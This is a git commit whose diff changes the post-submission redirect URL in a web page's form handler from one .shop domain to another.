ec847903f4f20f3f37a0b1d39f730126dfb29c75
husknet <127146284+husknet@users.noreply.github.com>
2024-08-13 09:02:14 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://nero.monermall.shop/';
+        window.location.href = 'https://ne.kraut-testerburg.shop/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
